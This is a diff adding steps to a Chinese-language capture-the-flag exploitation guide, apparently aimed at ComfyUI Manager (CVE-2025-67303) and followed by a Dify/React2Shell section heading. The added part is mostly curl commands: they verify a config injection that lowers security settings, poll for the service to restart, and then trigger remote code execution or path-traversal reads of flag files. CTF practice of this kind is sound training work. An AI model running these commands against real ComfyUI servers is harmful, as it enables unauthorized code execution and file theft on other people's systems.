@@ -92,6 +92,28 @@ print(s.recv(4096))
 ```
 - 如果当前响应和版本指纹支持 CVE-2025-67303，先做无害/安全检查，再按响应决定是否进入利用；不要把版本名称本身当作漏洞已证实。
 
+**每步必须校验，不要连续执行到底**：
+```bash
+# 注入后立即读回配置确认已写入
+curl -s "$TARGET/api/manager/db_mode?value=" | grep -oE 'security_level|allow_git_url_install' || true
+
+# 重启后等待服务就绪（不要盲目 sleep 固定时间后继续）
+for i in $(seq 1 20); do
+  code=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET/api/manager/version" --max-time 3 2>/dev/null)
+  [ "$code" = "200" ] && echo ready && break
+  sleep 1
+done
+```
+
+**拿 flag 的最终目标**：ComfyUI 题最终都是通过 RCE 读文件拿 flag，而不是无限调试配置：
+```bash
+# 配置注入成功后，优先直接触发 RCE 读 flag
+curl -s "$TARGET/api/manager/install" -X POST -H 'Content-Type: application/json' \
+  -d '{"url":"http://127.0.0.1:8188/../../../../flag"}'
+# 或直接读常见 flag 路径（若 CR 注入已能控制 config 里的路径）
+curl -s "$TARGET/file=/flag" ; curl -s "$TARGET/file=/challenge/flag"
+```
+
 ### 6.6 Dify / React2Shell (CVE-2025-55182) 多版本利用
 
 **场景**：Dify 平台（Next.js App Router + React Server Components），端口通常 3000。
